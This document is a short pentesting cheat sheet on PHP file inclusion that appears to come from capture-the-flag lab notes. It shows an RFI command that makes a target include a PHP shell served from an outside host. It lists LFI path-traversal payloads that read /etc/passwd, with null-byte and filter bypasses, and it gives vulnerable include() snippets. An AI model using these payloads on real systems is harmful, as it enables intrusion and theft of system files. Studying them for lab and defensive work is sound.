# Remote file inclusion

Start Http Server with python and php shell file

Host:
```console
$ python -m http.server 9001
```
Victim:
```console
$ curl 10.10.148.12/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.14.20.70:9002/shell.php
```

# Local file inclusion

## Payloads

```shell
../../../../etc/passwd
../../../../etc/passwd/.
../../../../etc/passwd%00
....//....//....//....//....//etc/passwd

Example:
http://10.10.13.178/lab6.php?file=THM-profile/../../../../etc/os-release%00
```

## Case 1 | Basic Get request

```php
<?PHP 
	include($_GET["lang"]);
?>
```
A `GET` request via URL parameter `lang` to include the file of the page. This can be calld with:  
`http://homepage.com/index.php?lang=EN.php` to load the `EN.php`.

If there isn't a input validatione, we can read any file e.g. `/etc/passwd`. We can try the following:   
`http://homepage.com/get.php?file=/etc/passwd`.
That is possible because the `include` function has no validation.

## Case 2 | Given directory

```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```

The directory is given but if there is no input validation, we can `path traversal` with the following payload  
`http://homepage/index.php?lang=../../../../etc/passwd`

## Null byte

```php
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/website/index.php on line 12
```

We could move outside the php directory but still, the include function reads reads the input with `.php` at the end. This is because the developer specified the file type.  
With a NULL BYTE we can bypass this: `%00` or hex `0x00`
Everthing behing this is beeing ignored. 

**NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.**

## Keyword filter

```shell
website/index.php?file=../../../../etc/passwd/.
```

The last `/.` is qual to a simple `cd` so you stay in the same directory
